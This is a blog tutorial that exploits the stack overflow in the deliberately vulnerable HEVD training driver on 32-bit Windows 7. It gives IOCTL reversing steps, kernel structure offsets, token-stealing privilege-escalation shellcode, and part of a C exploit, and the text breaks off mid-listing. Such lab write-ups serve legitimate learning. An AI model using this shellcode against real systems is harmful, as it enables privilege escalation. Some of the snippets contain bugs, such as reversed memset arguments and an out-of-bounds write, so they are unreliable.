<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Exploiting HackSys Kernel driver" /><meta name="author" content="M" /><meta property="og:locale" content="en" /><meta name="description" content="Hi all! Exploiting drivers offers tons of possibilities we couldn’t find in userland so it’s important to learn kernel internals because it will become more important for Windows security. Kernel exploitation is a very complex subject, and the more I learn about it the more I realize I must do basic things first. And that’s what I will explain today, a basic stack buffer overflow in a driver of Windows 7 32-bit. The chosen driver is the famous HEVD (HackSys Extreme Vulnerable Driver), a Windows Kernel driver with vulnerabilites. This vulnerable driver is the main reference to learn Kernel exploitation so if you are interested you can find it here. Special thanks to them!" /><meta property="og:description" content="Hi all! Exploiting drivers offers tons of possibilities we couldn’t find in userland so it’s important to learn kernel internals because it will become more important for Windows security. Kernel exploitation is a very complex subject, and the more I learn about it the more I realize I must do basic things first. And that’s what I will explain today, a basic stack buffer overflow in a driver of Windows 7 32-bit. The chosen driver is the famous HEVD (HackSys Extreme Vulnerable Driver), a Windows Kernel driver with vulnerabilites. This vulnerable driver is the main reference to learn Kernel exploitation so if you are interested you can find it here. Special thanks to them!" /><link rel="canonical" href="https://blamethekernel.github.io//posts/Exploiting-HackSys-Kernel-driver/" /><meta property="og:url" content="https://blamethekernel.github.io//posts/Exploiting-HackSys-Kernel-driver/" /><meta property="og:site_name" content="Gates of Kernel" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-03T09:50:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Exploiting HackSys Kernel driver" /><meta name="twitter:site" content="@blamethekernel" /><meta name="twitter:creator" content="@M" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"M"},"headline":"Exploiting HackSys Kernel driver","dateModified":"2022-01-08T19:21:12+01:00","datePublished":"2020-06-03T09:50:00+02:00","description":"Hi all! Exploiting drivers offers tons of possibilities we couldn’t find in userland so it’s important to learn kernel internals because it will become more important for Windows security. Kernel exploitation is a very complex subject, and the more I learn about it the more I realize I must do basic things first. And that’s what I will explain today, a basic stack buffer overflow in a driver of Windows 7 32-bit. The chosen driver is the famous HEVD (HackSys Extreme Vulnerable Driver), a Windows Kernel driver with vulnerabilites. This vulnerable driver is the main reference to learn Kernel exploitation so if you are interested you can find it here. Special thanks to them!","url":"https://blamethekernel.github.io//posts/Exploiting-HackSys-Kernel-driver/","mainEntityOfPage":{"@type":"WebPage","@id":"https://blamethekernel.github.io//posts/Exploiting-HackSys-Kernel-driver/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Exploiting HackSys Kernel driver | Gates of Kernel</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Gates of Kernel"><meta name="application-name" content="Gates of Kernel"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Gates of Kernel</a></div><div class="site-subtitle font-italic">Malware, Exploiting and Kernel Things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/blamethekernel" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/blamethekernel" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Exploiting HackSys Kernel driver</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Exploiting HackSys Kernel driver</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/blamethekernel">M</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2020-06-03 09:50:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Wed, Jun 3, 2020, 9:50 AM +0200" >Jun 3, 2020</em> </span> <span> Updated <em class="timeago" date="2022-01-08 19:21:12 +0100 " data-toggle="tooltip" data-placement="bottom" title="Sat, Jan 8, 2022, 7:21 PM +0100" >Jan 8</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1974 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p>Hi all!</p><p>Exploiting drivers offers tons of possibilities we couldn’t find in userland so it’s important to learn kernel internals because it will become more important for Windows security.</p><p>Kernel exploitation is a very complex subject, and the more I learn about it the more I realize I must do basic things first. And that’s what I will explain today, a basic stack buffer overflow in a driver of Windows 7 32-bit. The chosen driver is the famous HEVD (HackSys Extreme Vulnerable Driver), a Windows Kernel driver with vulnerabilites. This vulnerable driver is the main reference to learn Kernel exploitation so if you are interested you can find it <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">here</a>. Special thanks to them!</p><p>Doing one of the basic exploits in kernel will brings us a lot of knowledge about internals of Windows and drivers.</p><p>If you want to set up the kernel debugging environment I suggest <a href="https://www.abatchy.com/2018/01/kernel-exploitation-1">this</a> article from abatchy or hasherezade’s <a href="https://hshrzd.wordpress.com/2017/05/28/starting-with-windows-kernel-exploitation-part-1-setting-up-the-lab/">one</a>.</p><h3 id="some-internals-notes">Some internals notes<a href="#some-internals-notes" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>First of all, we need to understand how to communicate with the driver, so let’s talk a bit about kernel I/O. The main function to call a driver is DeviceIoControl let’s see a little description about DeviceIOControl:</p><blockquote><p>The DeviceIoControl function provides a device input and output control (IOCTL) interface through which an application can communicate directly with a device driver. The DeviceIoControl function is a general-purpose interface that can send control codes to a variety of devices. Each control code represents an operation for the driver to perform. For example, a control code can ask a device driver to return information about the corresponding device, or direct the driver to carry out an action on the device, such as formatting a disk.</p></blockquote><p>To reach a specific part of code of the driver you can especify by inserting a code, this code is also known as an IOCTL code:</p><blockquote><p>IO Control Codes (IOCTLs) are our primary search target as they include numerous important details we need to know. They are represented as DWORDs but each of the 32 bits represent a detail about the request: Transfer Type - Defines the way that data will be passed to the driver. These can either be METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, or METHOD_NEITHER. Function Code - The internal function to be executed by the driver. These are supposed to start at 0x800 but you will see many starting at 0x0 in practice. Device Type - The type of the driver’s device object specified during IoCreateDevice(). There are many device types defined in Wdm.h and Ntddk.h, but one of the most common to see for software drivers is FILE_DEVICE_UNKNOWN (0x22).</p></blockquote><h3 id="reversing-the-driver">Reversing the driver<a href="#reversing-the-driver" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>All Windows drivers must have a DriverEntry routine so Windows can load it. We will use WingDBG Preview to see it:</p><p><img data-src="/assets/kernel/driverEntry.png" alt="TEXTO HOVER" data-proofer-ignore></p><p>From DriverEntry we look with IDA for IrpDeviceIoCtlHandler, this function processes IOCTL requests done from userland to the HEVD driver, that means, depending the code you use here you can reach the function you want.</p><p><img data-src="/assets/kernel/buscandoIOCTL.png" alt="TEXTO HOVER" data-proofer-ignore></p><p>We want to reach TriggerStackOverflow function, and therefore we need to send a DeviceIoControl() request with a code set to 0x222003 as seen in its code.</p><p><img data-src="/assets/kernel/buscandoIOCTL2b.png" alt="TEXTO HOVER" data-proofer-ignore></p><p>Inside TriggerStackOverflow we see the length of the KernelBuffer, 0x800h (2048 bytes) where our data is copied. As we will see later, this buffer is not checking size so anything longer that 2048 bytes will crash the driver and the kernel.</p><p><img data-src="/assets/kernel/buscandoIOCTL3b.png" alt="TEXTO HOVER" data-proofer-ignore></p><h3 id="building-the-exploit">Building the exploit<a href="#building-the-exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We build make our exploit in C language. Why C? because C is the Kernel language so for the sake of symmetry C is the chosen one :)</p><p>To select the specific driver we want is necessary to get its handler, and we can do that with the CreateFileA from kernel32.dll, a function that allows for handler distribution from kernel-mode.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="n">HANDLE</span> <span class="n">driverHandle</span><span class="p">;</span>


    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]Opening handle to </span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="cm">/*
        HANDLE WINAPI CreateFile(
          _In_     LPCTSTR               lpFileName,
          _In_     DWORD                 dwDesiredAccess,
          _In_     DWORD                 dwShareMode,
          _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
          _In_     DWORD                 dwCreationDisposition,
          _In_     DWORD                 dwFlagsAndAttributes,
          _In_opt_ HANDLE                hTemplateFile
        );
    */</span>
    <span class="n">driverHandle</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span>
        <span class="n">DRIVER_PATH</span><span class="p">,</span>
        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
        <span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="o">|</span> <span class="n">FILE_FLAG_OVERLAPPED</span><span class="p">,</span>
        <span class="nb">NULL</span>
    <span class="p">);</span>
</pre></table></code></div></div><p>After getting the handle of the driver we need to communicate with him by his I/O function, DevideIoControl. Now we can use the handle to call DeviceIoControl and get a crash by sending a large buffer.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>    <span class="cm">/*
        BOOL WINAPI DeviceIoControl(
          _In_        HANDLE       hDevice,
          _In_        DWORD        dwIoControlCode,
          _In_opt_    LPVOID       lpInBuffer,
          _In_        DWORD        nInBufferSize,
          _Out_opt_   LPVOID       lpOutBuffer,
          _In_        DWORD        nOutBufferSize,
          _Out_opt_   LPDWORD      lpBytesReturned,
          _Inout_opt_ LPOVERLAPPED lpOverlapped
        );
    */</span>


    <span class="n">BOOL</span> <span class="n">bof</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span>
        <span class="n">driverHandle</span><span class="p">,</span>                       <span class="cm">/* handler for open driver */</span>
        <span class="n">STACK_IOCTL</span><span class="p">,</span>                        <span class="cm">/* IOCTL for the stack overflow */</span>
        <span class="n">lpInBuffer</span><span class="p">,</span>                          <span class="cm">/* our user buffer with retAddr */</span>
        <span class="n">RET_OFFSET</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">),</span>          <span class="cm">/* want up to the offset + 4 (for the retAddr) sent */</span>
        <span class="nb">NULL</span><span class="p">,</span>                               <span class="cm">/* no buffer for the driver to write back to */</span>
        <span class="mi">0</span><span class="p">,</span>                                  <span class="cm">/* above buffer of size 0 */</span>
        <span class="nb">NULL</span><span class="p">,</span>                               <span class="cm">/* dump variable for byte returned */</span>
        <span class="nb">NULL</span><span class="p">);</span>                              <span class="cm">/* ignore overlap */</span>
</pre></table></code></div></div><p>We must stop here to look closer this function because is the most important part of the exploit. A user-supplied buffer is being copied to a kernel buffer without boundary check, resulting in a stack smashing vulnerability if the buffer is longer than 2048 bytes.</p><p>You can see the vulnerable source code in <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/BufferOverflowStack.c#L107">this</a> line</p><p>As you can see there are three critical parameters:</p><ul><li>driverHandle: this will get the handle returned from CreateFileA.<li>STACK IOCTL: the I/O code which leads us to the vulnerable function that will trigger the stack overflow.<li>lpInBuffer: user buffer with retAddr<li>RET_OFFSET + sizeof(DWORD): to trigger the vulnerability we need our buffer longer than 2080</ul><p>So the first exploit to get the EIP control is to use a buffer with a pattern (pattern.rb is your friend). We discover the EIP is overwritten at 2080 byte. Let’s put some B’s in the EIP to be sure:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>
    <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>

    <span class="n">memset</span><span class="p">(</span><span class="sc">'A'</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="mi">2080</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="sc">'B'</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">[</span><span class="mi">2080</span><span class="p">],</span> <span class="mi">2084</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="sc">'C'</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">[</span><span class="mi">4164</span><span class="p">],</span> <span class="mi">3000</span><span class="p">);</span>

</pre></table></code></div></div><p><img data-src="/assets/kernel/crashB.png" alt="TEXTO HOVER" data-proofer-ignore></p><p>Exploit launched and we can find eip register full of ‘0x42’ followed with lots of ‘0x43’.</p><p>Now that we have control over the EIP our objective is to elevate privileges to NT AUTHORITY\SYSTEM and the chosen way will be “Token Steal Privilege” also known as “Access Token Manipulation”, more information about it <a href="https://www.peerlyst.com/posts/windows-kernel-exploitation-elevation-of-privilege-eop-with-token-stealing-chiheb-chebbi">here</a>.</p><p>In Windows all proccesses has an access token that specifies its security context. So we want our shellcode to steal the token from an elevated proccess and copy it into ours (spoiler, will be a shell).</p><p>Let’s see the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/Payloads.c#L63">payload</a> HackSys suggests. For a huge and very detailed analysis of the shellcode I recommend Connor McGarr <a href="https://connormcgarr.github.io/Kernel-Exploitation-1/">article</a>. Props to him for explaining lots of Windows Internals and WinDBG commands.</p><p>As a resumee these are the offsets we need to get to our exploit:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>
_KTHREAD offset <span class="o">=</span> 0x124 <span class="o">(</span>from _KPCR<span class="o">)</span>
_EPROCESS offset <span class="o">=</span> 0x50 <span class="o">(</span>from _KTHREAD<span class="o">)</span>
ActiveProcessLink offset <span class="o">=</span> 0x0b8 <span class="o">(</span>from _EPROCESS<span class="o">)</span>
Token offset <span class="o">=</span> 0x0f8 <span class="o">(</span>from EPROCESS<span class="o">)</span>

</pre></table></code></div></div><p>So the shellcode is:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>    <span class="kt">char</span> <span class="n">shellcode</span> <span class="p">[]</span> <span class="o">=</span>
            <span class="s">"</span><span class="se">\x60</span><span class="s">"</span>                        <span class="c1">// pushad</span>
        <span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>                        <span class="c1">// xor eax,eax</span>
        <span class="s">"</span><span class="se">\x64\xa1\x24\x01\x00\x00</span><span class="s">"</span>        <span class="c1">// mov eax,[fs:eax+0x124]</span>
        <span class="s">"</span><span class="se">\x8b\x40\x50</span><span class="s">"</span>                    <span class="c1">// mov eax,[eax+0x50]</span>
        <span class="s">"</span><span class="se">\x89\xc1</span><span class="s">"</span>                        <span class="c1">// mov ecx,eax</span>
        <span class="s">"</span><span class="se">\xba\x04\x00\x00\x00</span><span class="s">"</span>            <span class="c1">// mov edx,0x4</span>
        <span class="s">"</span><span class="se">\x8b\x80\xb8\x00\x00\x00</span><span class="s">"</span>        <span class="c1">// mov eax,[eax+0xb8]</span>
        <span class="s">"</span><span class="se">\x2d\xb8\x00\x00\x00</span><span class="s">"</span>            <span class="c1">// sub eax,0xb8</span>
        <span class="s">"</span><span class="se">\x39\x90\xb4\x00\x00\x00</span><span class="s">"</span>        <span class="c1">// cmp [eax+0xb4],edx</span>
        <span class="s">"</span><span class="se">\x75\xed</span><span class="s">"</span>                        <span class="c1">// jne 0x1a</span>
        <span class="s">"</span><span class="se">\x8b\x90\xf8\x00\x00\x00</span><span class="s">"</span>        <span class="c1">// mov edx,[eax+0xf8]</span>
        <span class="s">"</span><span class="se">\x89\x91\xf8\x00\x00\x00</span><span class="s">"</span>        <span class="c1">// mov [ecx+0xf8],edx</span>
        <span class="s">"</span><span class="se">\x61</span><span class="s">"</span>                            <span class="c1">// popad</span>
        <span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>                        <span class="c1">// xor eax,eax</span>
        <span class="s">"</span><span class="se">\x5d</span><span class="s">"</span>                            <span class="c1">// pop ebp</span>
        <span class="s">"</span><span class="se">\xc2\x08\x00</span><span class="s">"</span><span class="p">;</span>                   <span class="c1">// ret 0x8</span>
</pre></table></code></div></div><p>To evade DEP we will create a memory region RWX permissions with VirtualAlloc() and we will put our shellcode there:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>    <span class="n">LPVOID</span> <span class="n">userBuffer</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span>
                                  <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span>
                                  <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
                                  <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">userBuffer</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Error allocating the user buffer</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] userBuffer @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">userBuffer</span><span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">userBuffer</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
</pre></table></code></div></div><h3 id="launching-the-exploit">Launching the exploit<a href="#launching-the-exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>So our final exploit looks like this:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;windows.h&gt;
#include &lt;winioctl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
</span>

<span class="cp">#define SHELLCODE_LEN   57
#define RET_OFFSET      2080
#define DRIVER_PATH     "\\\\.\\HackSysExtremeVulnerableDriver"
#define STACK_IOCTL     0x222003
</span>
<span class="kt">void</span> <span class="nf">exploit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">typedef</span> <span class="kt">void</span><span class="o">*</span> <span class="n">HANDLE</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">driverHandle</span><span class="p">;</span>


    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Opening handle to </span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="cm">/*
        HANDLE WINAPI CreateFile(
          _In_     LPCTSTR               lpFileName,
          _In_     DWORD                 dwDesiredAccess,
          _In_     DWORD                 dwShareMode,
          _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
          _In_     DWORD                 dwCreationDisposition,
          _In_     DWORD                 dwFlagsAndAttributes,
          _In_opt_ HANDLE                hTemplateFile
        );
    */</span>
    <span class="n">driverHandle</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span>
        <span class="n">DRIVER_PATH</span><span class="p">,</span>
        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
        <span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="o">|</span> <span class="n">FILE_FLAG_OVERLAPPED</span><span class="p">,</span>
        <span class="nb">NULL</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">driverHandle</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] FATAL: Could not open HEVD handle</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="kt">char</span> <span class="n">shellcode</span> <span class="p">[]</span> <span class="o">=</span>
        <span class="s">"</span><span class="se">\x60</span><span class="s">"</span>                            <span class="c1">// pushad</span>
        <span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>                        <span class="c1">// xor eax,eax</span>
        <span class="s">"</span><span class="se">\x64\xa1\x24\x01\x00\x00</span><span class="s">"</span>        <span class="c1">// mov eax,[fs:eax+0x124]</span>
        <span class="s">"</span><span class="se">\x8b\x40\x50</span><span class="s">"</span>                    <span class="c1">// mov eax,[eax+0x50]</span>
        <span class="s">"</span><span class="se">\x89\xc1</span><span class="s">"</span>                        <span class="c1">// mov ecx,eax</span>
        <span class="s">"</span><span class="se">\xba\x04\x00\x00\x00</span><span class="s">"</span>            <span class="c1">// mov edx,0x4</span>
        <span class="s">"</span><span class="se">\x8b\x80\xb8\x00\x00\x00</span><span class="s">"</span>        <span class="c1">// mov eax,[eax+0xb8]</span>
        <span class="s">"</span><span class="se">\x2d\xb8\x00\x00\x00</span><span class="s">"</span>            <span class="c1">// sub eax,0xb8</span>
        <span class="s">"</span><span class="se">\x39\x90\xb4\x00\x00\x00</span><span class="s">"</span>        <span class="c1">// cmp [eax+0xb4],edx</span>
        <span class="s">"</span><span class="se">\x75\xed</span><span class="s">"</span>                        <span class="c1">// jnz 0x1a</span>
        <span class="s">"</span><span class="se">\x8b\x90\xf8\x00\x00\x00</span><span class="s">"</span>        <span class="c1">// mov edx,[eax+0xf8]</span>
        <span class="s">"</span><span class="se">\x89\x91\xf8\x00\x00\x00</span><span class="s">"</span>        <span class="c1">// mov [ecx+0xf8],edx</span>
        <span class="s">"</span><span class="se">\x61</span><span class="s">"</span>                            <span class="c1">// popad</span>
        <span class="s">"</span><span class="se">\x31\xc0</span><span class="s">"</span>                        <span class="c1">// xor eax,eax</span>
        <span class="s">"</span><span class="se">\x5d</span><span class="s">"</span>                            <span class="c1">// pop ebp</span>
        <span class="s">"</span><span class="se">\xc2\x08\x00</span><span class="s">"</span><span class="p">;</span>                   <span class="c1">// ret 0x8</span>

    <span class="cm">/*
    LPVOID WINAPI VirtualAlloc(
      _In_opt_ LPVOID lpAddress,
      _In_     SIZE_T dwSize,
      _In_     DWORD  flAllocationType,
      _In_     DWORD  flProtect
    );
    */</span>
    <span class="n">LPVOID</span> <span class="n">userBuffer</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span>
                                  <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span>
                                  <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
                                  <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">userBuffer</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Error allocating the user buffer</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
